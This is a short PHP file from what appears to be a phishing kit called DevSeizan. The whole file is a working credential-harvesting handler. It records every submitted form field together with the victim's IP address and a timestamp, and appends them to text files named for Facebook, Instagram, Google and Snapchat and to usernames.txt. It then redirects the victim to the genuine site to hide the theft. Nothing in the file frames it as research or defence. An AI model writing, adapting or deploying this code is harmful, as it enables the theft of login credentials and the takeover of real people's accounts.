<?php
// DevSeizan - Data Capture Handler

$date = date("Y-m-d H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$page = isset($_POST['page']) ? htmlspecialchars($_POST['page']) : 'unknown';

// Log format for usernames.dat (compatible with main script)
$data = "Date: $date\n";
$data .= "IP: $ip\n";
$data .= "Page: $page\n";

// Capture all POST data
foreach($_POST as $key => $value) {
    if($key != 'page') {
        $clean_value = htmlspecialchars($value);
        $data .= ucfirst($key) . ": $clean_value\n";
    }
}

$data .= "--------------------\n\n";

// Determine file and redirect
switch($page) {
    case 'facebook':
    case 'facebook_security':
        $filename = "facebook-data.txt";
        $redirect = "https://www.facebook.com";
        break;
    case 'instagram':
    case 'instagram_followers':
        $filename = "instagram-data.txt";
        $redirect = "https://www.instagram.com";
        break;
    case 'google':
        $filename = "google-data.txt";
        $redirect = "https://www.google.com";
        break;
    case 'snapchat':
        $filename = "snapchat-data.txt";
        $redirect = "https://www.snapchat.com";
        break;
    default:
        $filename = "other-data.txt";
        $redirect = "https://www.google.com";
}

// Save to file
file_put_contents($filename, $data, FILE_APPEND | LOCK_EX);

// Also save to usernames.dat for main script compatibility
file_put_contents("usernames.txt", $data, FILE_APPEND | LOCK_EX);

// Redirect
header("Location: $redirect");
exit();
?>